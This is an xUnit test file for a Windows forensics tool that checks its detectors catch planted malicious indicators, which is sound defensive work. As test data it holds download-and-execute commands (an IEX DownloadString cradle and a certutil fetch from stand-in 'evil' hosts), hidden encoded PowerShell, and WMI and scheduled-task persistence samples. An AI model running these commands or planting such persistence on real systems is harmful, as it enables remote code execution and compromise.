using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using WinDFIR.Core.Analysis;
using WinDFIR.Providers.Parsers;
using Xunit;

namespace WinDFIR.Tests.Validation;

/// <summary>
/// True-positive coverage: plant a known-bad indicator into each detector's input and assert it FIRES.
/// Complements the clean-host / differential tests (which prove "no false positives" and "matches the
/// reference tool") by proving the detectors actually catch malicious patterns, not just stay silent.
/// These are portable (no sample files); see docs/VALIDATION_PLAYBOOK.md for generating real malicious samples.
/// </summary>
public class PositiveDetectionTests
{
    [Theory]
    [InlineData(@"powershell.exe -nop -w hidden -enc SQBFAFgA", "-enc")]
    [InlineData(@"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')", "iex")]
    [InlineData(@"certutil -urlcache -f http://evil/x.exe x.exe", "certutil")]
    public void PowerShellHistory_FlagsSuspiciousCommand(string command, string expectedKeywordSubstr)
    {
        var keywords = PowerShellHistoryParser.DetectSuspiciousKeywords(command);
        Assert.NotEmpty(keywords);
        Assert.Contains(keywords, k => k.Contains(expectedKeywordSubstr, StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void ScheduledTask_SurfacesEncodedPowerShellPayload()
    {
        const string xml = """
        <?xml version="1.0" encoding="UTF-16"?>
        <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo><Author>EVIL</Author></RegistrationInfo>
          <Actions>
            <Exec>
              <Command>powershell.exe</Command>
              <Arguments>-nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A</Arguments>
            </Exec>
          </Actions>
        </Task>
        """;

        var record = ScheduledTaskParser.ParseXml(xml, @"\Custom\Backdoor");
        Assert.NotNull(record);
        var exec = record!.PrimaryExec;
        Assert.NotNull(exec);
        Assert.Equal("powershell.exe", exec!.Command);
        Assert.Contains("EncodedCommand", exec.Arguments ?? "", StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Wmi_RecoversMaliciousActiveScriptSubscription()
    {
        var runs = new List<string>
        {
            "__EventFilter", @"root\subscription", "BackdoorFilter",
            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'", "WQL",
            "__FilterToConsumerBinding",
            "ActiveScriptEventConsumer.Name=\"Backdoor\"",
            "__EventFilter.Name=\"BackdoorFilter\""
        };

        var records = WmiPersistenceParser.ExtractFromRuns(runs);

        Assert.Contains(records, r => r.Kind == "Binding" && r.ConsumerClass == "ActiveScriptEventConsumer" && r.ConsumerName == "Backdoor");
        Assert.Contains(records, r => r.Kind == "Filter" && (r.Query ?? "").Contains("__InstanceModificationEvent", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Bits_RecoversMaliciousDownloadUrlAndPath()
    {
        var blob = Utf16("http://evil.example/payload.exe")
            .Concat(new byte[] { 0, 0, 0x01, 0x00 })
            .Concat(Utf16(@"C:\Users\v\AppData\Local\Temp\p.exe"))
            .ToArray();

        var strings = BitsParser.ExtractUtf16Strings(blob);
        var record = BitsParser.BuildRecord("File", Guid.NewGuid(), strings);

        Assert.Contains(record.Urls, u => u == "http://evil.example/payload.exe");
        Assert.Contains(record.LocalPaths, p => p.EndsWith(@"\p.exe", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void CrossSourceService_FlagsServiceHiddenFromLiveApi()
    {
        var live = new[]
        {
            new CrossSourceItem { Key = "wuauserv", Display = "wuauserv" },
            new CrossSourceItem { Key = "spooler", Display = "spooler" }
        };
        var offline = new[]
        {
            new CrossSourceItem { Key = "wuauserv", Display = "wuauserv" },
            new CrossSourceItem { Key = "spooler", Display = "spooler" },
            new CrossSourceItem { Key = "evilsvc", Display = "evilsvc" } // in raw hive, hidden from live API
        };

        var anomalies = CrossSourceAnomalyDetector.Compare("Service", live, offline, compareValues: false);

        var hidden = Assert.Single(anomalies);
        Assert.Equal(CrossSourceAnomalyDetector.MissingFromLive, hidden.Kind);
        Assert.Equal("evilsvc", hidden.Key);
    }

    private static byte[] Utf16(string s) => Encoding.Unicode.GetBytes(s);
}
